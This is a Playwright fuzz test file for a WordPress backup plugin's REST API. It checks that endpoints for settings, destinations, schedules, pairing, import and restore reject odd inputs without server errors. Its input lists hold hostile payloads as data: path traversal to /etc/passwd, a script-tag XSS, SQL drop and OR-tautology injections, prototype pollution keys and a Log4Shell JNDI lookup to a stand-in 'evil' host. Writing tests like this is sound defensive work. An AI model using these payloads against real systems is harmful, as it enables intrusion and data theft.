/**
 * 09-fuzz.spec.ts
 * Deep QA: fuzz testing.
 *
 * Random / weird inputs to settings, destination config, schedule, labels.
 * The aim is "no 500s, no PHP fatals, no data loss" — graceful rejection
 * is the only acceptable behaviour for invalid input.
 */
import { test, expect } from '@playwright/test';
import { getNonce, apiPost, apiPut, BASE, NS } from './_helpers';

test.beforeEach(async ({ page }) => {
  await page.goto(`${BASE}/wp-admin/admin.php?page=nxt-backup`);
});

const RANDOM_STRINGS = [
  '',
  ' ',
  '\x00',
  '\n\r\t',
  '🦀'.repeat(50),
  '‮‮',                // RTL override sneak
  '../etc/passwd',
  'AAAAAAAAAA'.repeat(1000),
  '<script>alert(1)</script>',
  'DROP TABLE wp_users;',
  '__proto__',
  'constructor.prototype',
  '${jndi:ldap://evil}',
  '%n%n%n%n',
  '\\\\.\\globalroot\\hello',
];

const RANDOM_NUMBERS = [0, -1, 1.5, NaN, Infinity, -Infinity, 2 ** 53, -(2 ** 53)];

// ── Fuzz settings: split_archive_mb ──────────────────────────────────────────
for (const v of RANDOM_NUMBERS) {
  test(`@deep FUZZ-001 — PUT settings split_archive_mb=${v} does not 500`, async ({ page, request }) => {
    const nonce = await getNonce(page);
    const res   = await apiPut(request, nonce, '/backup/settings', {
      split_archive_mb: v,
    });
    expect([200, 400, 422]).toContain(res.status());
  });
}

// ── Fuzz destination label ───────────────────────────────────────────────────
for (const s of RANDOM_STRINGS) {
  test(`@deep FUZZ-002 — PUT destinations with label=${JSON.stringify(s.slice(0, 20))} does not 500`, async ({ page, request }) => {
    const nonce = await getNonce(page);
    const res   = await apiPut(request, nonce, '/backup/destinations', {
      type:    'local',
      label:   s,
      enabled: false,
      config:  {},
    });
    expect([200, 400, 422]).toContain(res.status());
    if (res.status() === 200) {
      // Cleanup
      const id = (await res.json()).data?.id as string;
      await request.delete(`${NS}/backup/destinations/${id}`, {
        headers: { 'X-WP-Nonce': nonce, 'Content-Type': 'application/json' },
        data:    { confirm_password: process.env.WP_ADMIN_PASS ?? 'password' },
      });
    }
  });
}

// ── Fuzz schedule fields ─────────────────────────────────────────────────────
test('@deep FUZZ-003 — Schedule with weird interval string does not 500', async ({ page, request }) => {
  const nonce = await getNonce(page);
  for (const s of RANDOM_STRINGS.slice(0, 10)) {
    const res = await apiPut(request, nonce, '/backup/settings', {
      schedule_files_interval: s,
    });
    expect([200, 400, 422]).toContain(res.status());
  }
});

// ── Fuzz pair code ───────────────────────────────────────────────────────────
test('@deep FUZZ-004 — POST /pair/accept with random codes does not 500', async ({ request }) => {
  for (const s of RANDOM_STRINGS.slice(0, 10)) {
    const res = await request.post(`${NS}/backup/pair/accept`, {
      headers: { 'Content-Type': 'application/json' },
      data:    { code: s },
    });
    // Acceptable: 400 (invalid), 401, 422, 429 (rate limit)
    expect([400, 401, 403, 422, 429]).toContain(res.status());
  }
});

// ── Fuzz settings export → import malformed ──────────────────────────────────
test('@deep FUZZ-005 — Settings import with garbage payload does not 500', async ({ page, request }) => {
  const nonce = await getNonce(page);

  const garbage = [
    {},
    { settings: 'not-an-object' },
    { schedule_files_interval: { nested: 'object' } },
    { __proto__: { isAdmin: true } },
    Array(1000).fill('item'),
  ];

  for (const g of garbage) {
    const res = await apiPost(request, nonce, '/backup/settings/import', g);
    expect([200, 400, 422]).toContain(res.status());
  }
});

// ── Fuzz restore body ────────────────────────────────────────────────────────
test('@deep FUZZ-006 — POST /backup/restore/{id} with random components array', async ({ page, request }) => {
  const nonce = await getNonce(page);
  // Use any backup id (will 404 if none exist — still tests the parser)
  const id = 'fuzz-' + Date.now();
  for (const c of [
    null, [], 'string-not-array', [1, 2, 3], [{ obj: true }],
    Array(100).fill('db'),
  ]) {
    const res = await apiPost(request, nonce, `/backup/restore/${id}`, {
      components:       c,
      confirm_password: process.env.WP_ADMIN_PASS ?? 'password',
    });
    expect([200, 400, 404, 422]).toContain(res.status());
  }
});

// ── Fuzz destination config ───────────────────────────────────────────────────
test('@deep FUZZ-007 — PUT destinations with random config blob does not 500', async ({ page, request }) => {
  const nonce  = await getNonce(page);
  const blobs: unknown[] = [
    { huge_array: Array(1000).fill('x') },
    { deeply: { nested: { object: { with: { many: { keys: true } } } } } },
    { number: NaN },
    { unicode: '🚀'.repeat(100) },
    { sql: "1' OR '1'='1" },
  ];

  for (const b of blobs) {
    const res = await apiPut(request, nonce, '/backup/destinations', {
      type:    'local',
      label:   'fuzz',
      enabled: false,
      config:  b,
    });
    expect([200, 400, 422]).toContain(res.status());
    if (res.status() === 200) {
      const id = (await res.json()).data?.id as string;
      await request.delete(`${NS}/backup/destinations/${id}`, {
        headers: { 'X-WP-Nonce': nonce, 'Content-Type': 'application/json' },
        data:    { confirm_password: process.env.WP_ADMIN_PASS ?? 'password' },
      });
    }
  }
});

// ── Verify no 5xx from any fuzz round ────────────────────────────────────────
test('@deep FUZZ-008 — No previous fuzz call left the plugin in a 500-on-stats state', async ({ page, request }) => {
  const nonce = await getNonce(page);
  const res   = await request.get(`${NS}/backup/stats`, {
    headers: { 'X-WP-Nonce': nonce },
  });
  expect(res.status()).toBe(200);
});
